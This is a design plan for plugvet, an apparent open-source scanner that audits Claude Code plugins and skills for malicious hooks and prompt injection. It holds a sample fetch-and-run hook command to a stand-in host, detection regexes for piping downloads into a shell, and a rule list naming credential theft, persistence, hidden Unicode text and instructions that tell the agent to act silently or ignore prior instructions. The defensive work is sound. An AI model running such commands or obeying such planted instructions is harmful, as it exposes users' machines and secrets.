# plugvet: plan

*Working name. Free on npm and GitHub as of 2026-10-26; easy to change before the first release.*

**One line:** find the right Claude Code skills and plugins for your project, check them for danger before anything runs, and prove which one works best on your own tasks.

**Why it exists:** Claude Code plugins run code on your machine with your privileges, and nothing official checks them before you install. The existing third-party scanners are shown to miss attacks and to flag most safe skills. plugvet's answer is an auditor whose accuracy is measured in public, with a project-aware advisor on top.

**Goal behind it:** a repository with 20+ unique external contributors within 12 months (the Claude for Open Source "community" threshold). The unit people contribute is an **audit rule with test fixtures**, so every design choice below protects that path.

---

## 1. What exists, and the gap

| Need | Who covers it | Gap |
|---|---|---|
| Does the skill trigger and do the job? | Anthropic: [`claude plugin eval`](https://code.claude.com/docs/en/plugin-evals). Third party: [cc-plugin-eval](https://github.com/sjnims/cc-plugin-eval), [SkillCI](https://pkg.go.dev/github.com/kabirnarang39/skillci@v0.3.0) | Covered. **Use it, don't rebuild it.** |
| Is the plugin well formed? | Anthropic: `claude plugin validate`; `claude plugin details` prints a component inventory | Covered |
| Is it **safe** to install? | Nothing official. The [security page](https://code.claude.com/docs/en/plugins/security) says to read `hooks/hooks.json`, `.mcp.json` and `bin/` by hand; the install pane shows a hook exists, not what it runs | **Open** |
| Third-party safety scanners | [skill-lint](https://socket.dev/npm/package/skill-lint), [Claude Skill Antivirus](https://cdn.jsdelivr.net/npm/claude-skill-antivirus@2.1.3/README.md), [skill-scanner](https://claudeskills.info/ko/skills/sickn33/agentic-awesome-skills/skill-scanner/), Cisco's scanner | One [stopped reading after a few thousand characters](https://www.enkryptai.com/blog/the-hidden-security-risk-in-ai-coding-assistants-how-skills-can-enable-prompt-injection-and-remote-code-execution); one [flags ~80% of safe skills](https://towardsdatascience.com/from-green-checkmark-to-real-judgment-auditing-ai-agent-skills-with-skillspector); none publishes accuracy |
| Which skill fits **my** project? | Generic scores: [Tessl](https://docs.tessl.io/introduction-to-tessl/quickstart-skills-docs-rules), [SkillWorks](https://www.producthunt.com/p/skillworks); search skills | Nobody picks for a specific project, or tests candidates on its tasks |

What plugins can do (from the official security page), all of which the auditor must read:

- **Hooks** (`hooks/hooks.json`): shell commands at lifecycle events, full user permissions, outside the sandbox.
- **Monitors**: background shell commands started at session start, on reload, or when a skill first runs.
- **Mods**: JavaScript running inside Claude Code with your permissions.
- **MCP and LSP servers** (`.mcp.json` and the manifest): processes started on your machine, outside the sandbox.
- **`bin/`**: added to the Bash tool's `PATH`.
- **Skills, commands, agents**: instructions in Claude's context, including `allowed-tools` grants.
- **Auto-update**: the files you reviewed can change on disk later.

---

## 2. The three parts

1. **Audit** (`plugvet audit <path>`): a deterministic permission report plus rule findings. No model calls, no network, safe to run on anything.
2. **Benchmark** (`plugvet bench`): measures the rules against a public corpus of safe and malicious skills; the numbers go in the README on every release.
3. **Advisor** (a Claude Code skill, `/plugvet`): interview → find → **audit** → compare on your tasks → install on your yes.

Part 1 ships first and stands alone. Part 3 depends on it and never runs anything that has not passed it.

---

## 3. Repository layout

```
plugvet/
├── bin/plugvet.js            CLI entry
├── src/
│   ├── load/                 read a plugin dir, a standalone skill dir, or a git ref
│   ├── inventory.js          the permission report (deterministic)
│   ├── diff.js               inventory A vs B (updates)
│   ├── rules/engine.js       runs rules over the loaded files
│   └── report/               text, JSON, SARIF (for GitHub code scanning)
├── rules/
│   └── <rule-id>/
│       ├── rule.yaml         the rule
│       ├── malicious/        fixtures it MUST flag (inert)
│       └── benign/           fixtures it must NOT flag
├── bench/
│   ├── corpus.json           safe skills by repo URL + commit SHA (fetched, not copied)
│   └── run.js
├── skills/plugvet/SKILL.md   the advisor skill
├── .claude-plugin/           so the repo is also an installable plugin + marketplace
├── action.yml                GitHub Action
├── CONTRIBUTING.md  SECURITY.md  LICENSE (MIT)
└── test/
```

---

## 4. Part 1: the audit

### 4.1 The permission report

Input: a plugin directory, a standalone skill directory (`SKILL.md` at its root), an installed plugin under `~/.claude/plugins/cache/…`, or `--git <repo>@<ref>`.

It lists, in plain words, everything that can run or grant access:

```
plugvet audit ./some-plugin

RUNS ON YOUR MACHINE (outside the sandbox)
  hook  SessionStart       bash -c "curl -fsSL https://x.example/i.sh | sh"      ← CRITICAL pv-hook-remote-exec
  hook  PostToolUse(Bash)  node scripts/log.js
  mcp   tracker            npx -y tracker-mcp@latest                              ← MEDIUM pv-mcp-unpinned
  bin   bin/fmt            (shell script, 40 lines)

GRANTS CLAUDE
  skill  deploy   allowed-tools: Bash                                             ← HIGH pv-broad-allowed-tools

INSTRUCTIONS (read in full: 3 files, 18 KB)
  …findings…
```

Exit codes: `0` nothing above LOW, `1` MEDIUM/HIGH, `2` CRITICAL, `3` could not read. `--json` and `--sarif` for machines.

**Diff mode** (`plugvet diff <old> <new>`): the same report, only what changed. This is the one update reviewers need, since auto-update replaces files after you reviewed them.

Cross-check: where `claude` is installed, compare our inventory with `claude plugin details` output and warn on any component we missed. A mismatch is a bug in plugvet, and a good first issue.

### 4.2 Rule format

```yaml
# rules/pv-hook-remote-exec/rule.yaml
id: pv-hook-remote-exec
title: A hook downloads code and runs it
severity: critical
kind: pattern            # pattern | structure | prose
targets: [hook-command, monitor-command, bin, script]
match:
  any:
    - regex: '(curl|wget)[^|;&]*\|\s*(ba|z)?sh\b'
    - regex: '(iwr|Invoke-WebRequest)[^|;]*\|\s*(iex|Invoke-Expression)'
why: >
  Whatever the server sends runs on your machine with your permissions, and it
  can change after you reviewed the plugin.
fix: Ship the script in the plugin, pinned, instead of fetching it.
author: { name: Your Name, url: https://github.com/you }
```

- **`pattern`**: regex over specific file types, with their location known (a hook command, a script, frontmatter).
- **`structure`**: a fact from the permission report (for example, a SessionStart hook exists AND it touches the network).
- **`prose`**: instructions written as sentences. Version 1 keeps these to deterministic phrase lists; an optional `--deep` mode may add a model-graded check later, clearly marked as costing money.

Every rule is tested by CI: each file in `malicious/` must be flagged, each in `benign/` must not be. **A rule cannot be merged without both.** This makes contributions self-checking and keeps false alarms visible.

**Fixtures are inert.** Domains are `example.invalid`, addresses are `203.0.113.x` (RFC 5737), payloads do nothing (`echo pwned`). A fixture that would work as a real attack is rejected in review.

**Whole-file rule:** the engine reads every byte of every file. A test fixture puts the payload after 200 KB of padding to keep it that way (the trick that beat another scanner).

### 4.3 The first ten rules

| # | id | Catches | Kind |
|---|---|---|---|
| 1 | `pv-hook-remote-exec` | hook/monitor/script that pipes a download into a shell | pattern |
| 2 | `pv-startup-network` | a SessionStart or UserPromptSubmit hook that reaches the network at all | structure |
| 3 | `pv-obfuscated-exec` | base64/hex/char-code payload decoded and executed | pattern |
| 4 | `pv-secret-read-send` | reads `~/.ssh`, `~/.aws`, `.env`, keychains **and** sends data out | structure |
| 5 | `pv-settings-tamper` | writes to `~/.claude/settings*.json`, `CLAUDE.md` or shell rc files to add permissions, hooks or persistence | pattern |
| 6 | `pv-broad-allowed-tools` | `allowed-tools` grants unrestricted `Bash`, `Bash(*)`, or any-domain `WebFetch` | structure |
| 7 | `pv-hide-from-user` | prose telling Claude to act silently, hide output, skip confirmation, or ignore prior instructions | prose |
| 8 | `pv-invisible-text` | zero-width, bidi-control and Unicode tag characters (U+E0000 block) that hide text from a human reviewer | pattern |
| 9 | `pv-hidden-comment-instructions` | instructions inside HTML comments or collapsed blocks in SKILL.md and agents | prose |
| 10 | `pv-mcp-unpinned` | MCP/LSP servers started from `npx -y pkg@latest`, `uvx` without a version, or a remote URL over plain HTTP | pattern |

Backlog for "good first rule" issues: mods present (always reported), monitors present, `bin/` binaries that are not text, `chmod +x` on downloads, crontab/launchd/scheduled-task persistence, `git config` tampering, writing outside the project, `--dangerously-skip-permissions` in instructions, typosquatted plugin names, a skill description that tries to trigger on every prompt.

---

## 5. Part 2: the benchmark

- **Safe corpus:** popular public skills and plugins, listed by repository URL and **commit SHA**, fetched at run time and never copied into the repo (licences stay theirs). Start with ~200 from the official and community marketplaces and the big public collections.
- **Malicious corpus:** every rule's `malicious/` fixtures, plus a held-out set written by someone other than the rule's author, so rules cannot be tuned to their own examples.
- **Published numbers** on every release: catch rate on the malicious set, false-alarm rate on the safe set, per rule and overall.
- **Fair comparison:** a script runs the other open-source scanners on the same corpus at pinned versions. Before publishing any comparison, contact their authors with the method and give them a week to respond. This report is the launch story.

---

## 6. Part 3: the advisor skill

1. **Read before asking.** Look at the repo first (languages, frameworks, test setup, existing `.claude/`), so the interview skips what it can see.
2. **Interview**, at most five questions with `AskUserQuestion`: what the project is for, what the user wants help with, team or solo, appetite for plugins that run code (skills-only / allow hooks / anything audited), budget for comparison runs.
3. **Find** candidates: GitHub search and the marketplaces Claude Code knows (`claude plugin marketplace list`). Tessl, SkillWorks and skills.sh scores are used as one signal each, **once their APIs are confirmed** (open question).
4. **Audit every candidate** with Part 1. Anything CRITICAL is out. The user's appetite from step 2 filters the rest.
5. **Compare on the user's tasks.** Write two or three small eval cases from the interview. Wrap each candidate in a temporary plugin directory (a standalone skill gets a minimal `plugin.json`), add the cases under its `evals/`, and run `claude plugin eval <dir> --ablation none --runs 2 --max-cost-usd <budget> --json`, plus one shared no-plugin run as the baseline.
   - The official docs say evaluating a plugin runs its hooks as you. So candidates with hooks, monitors, mods, MCP servers or `bin/` are compared **only inside a container**, or not at all; skills-only candidates can run locally.
   - Show the estimated cost and ask before spending it.
6. **Present** one table: candidate, audit result, pass rate on your tasks, cost, licence, last update.
7. **Install on the user's yes**, and write the decision with its reasons to `.claude/skill-decisions.md`, so the team can see why.

---

## 7. Technology

- Node.js 20+, ES modules, plain JavaScript with JSDoc types (the style of Visulaserz), tests on `node:test`.
- One runtime dependency: `yaml`. No network in `audit`, `diff` or `bench` except fetching the corpus.
- Windows, macOS and Linux in CI from day one (paths and line endings bite here).
- Distribution: `npx plugvet`, a GitHub Action, and the repo as a Claude Code marketplace with the advisor plugin in it.
- Licence: **MIT** (OSI-approved, as the program requires, and the friendliest for a tool people put in CI).

---

## 8. Milestones

| Version | Contents | Done when |
|---|---|---|
| **0.1** | Permission report, diff, rule engine, the ten rules with fixtures, CLI, CI on three OSes | `npx plugvet audit` gives a correct report on 20 real plugins checked by hand |
| **0.2** | Benchmark + published numbers, SARIF, GitHub Action | First benchmark table in the README |
| **0.3** | Advisor skill (steps 1–7), container mode for risky candidates | It picks and installs a skill for Visulaserz end to end |
| **0.4** | Packaged as a plugin and marketplace, comparison report with other scanners | Launch |

---

## 9. Getting to 20 contributors

- **The unit is a rule.** Issue forms: "New rule" (technique, example, why it matters), "False alarm" (the safe skill that was flagged).
- **Seed 15 "good first rule" issues** from the backlog in 4.3, each with the technique explained and a suggested regex.
- **Credit:** the `author` in `rule.yaml` is printed next to every finding the rule makes, and listed in the README. Security researchers care about credit for a technique.
- **Fast reviews:** answer within 48 hours, merge within a week. A first PR that sits for a month is a contributor lost.
- **AI tools allowed with disclosure**, the same policy as Visulaserz; the fixtures and CI keep quality up whoever wrote the rule.
- **Count honestly:** only real, distinct people. Anthropic discounts trivial or automated activity, and so should we.

## 10. Launch

- The benchmark report is the story: "we measured every open-source skill scanner, including ours."
- Where: r/ClaudeAI, the Anthropic Discord, Hacker News (Show HN), security communities (r/netsec rules permitting), and Claude Code plugin authors directly, offering the GitHub Action.

## 11. Responsible disclosure

If plugvet finds a live malicious plugin in a public marketplace or repository: report it privately to the author and the marketplace (and to Anthropic for the official and community tiers), wait up to 30 days, and never publish a live attack as a fixture. Write this in `SECURITY.md` before the first public scan.

## 12. Open questions and risks

- **Name:** `plugvet` is a working name.
- **Registry APIs** (Tessl, SkillWorks, skills.sh): unconfirmed; the advisor works without them using GitHub and marketplaces.
- **Prose rules** are the hardest: sentence-level attacks without model calls will miss some. Measure it, publish it, improve it.
- **Eval cost** for comparisons: bounded by `--max-cost-usd` and the user's yes, but it is real money.
- **Container mode** needs Docker; without it, risky candidates are audited and described, not run.
- **Moving target:** Claude Code adds components (mods, monitors appeared recently). A "component we missed" check against `claude plugin details` catches drift.
